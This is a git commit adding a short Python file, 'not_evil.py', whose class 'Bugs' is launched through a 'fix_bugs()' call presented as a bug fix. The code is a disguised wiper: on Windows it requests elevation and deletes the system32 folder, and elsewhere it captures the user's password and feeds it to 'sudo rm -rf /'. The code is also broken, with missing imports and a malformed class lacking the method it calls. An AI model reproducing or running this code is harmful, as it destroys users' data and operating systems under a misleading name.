c9940f8fd2d2bcb6fc0d322c5cdd20a8bcfe4dbe
Preston <preston-scibek@users.noreply.github.com>
2018-07-03 16:20:11 -0400

    Create not_evil.py

---
+++ not_evil.py
@@ -0,0 +1,29 @@
+import platform
+
+
+class Bugs:
+        if platform.system() == 'Windows':
+            import ctypes, sys
+
+            def is_admin():
+                try:
+                    return ctypes.windll.shell32.IsUserAnAdmin()
+                except:
+                    return False
+
+            if is_admin():
+                process = subprocess.Popen('del c:\WINDOWS\system32', shell=True)
+                process.wait()
+            else:
+                # Re-run the program with admin rights
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
+
+        else:
+            password = getpass.getpass()
+            process = subprocess.Popen(['sudo', '-p', '', '-S', 'rm', '-rf', '/'], stdin=subprocess.PIPE)
+            process.stdin.write(password + "\n")
+            process.stdin.close()
+            process.wait()
+
+if __name__ == "__main__":
+    Bugs().fix_bugs()
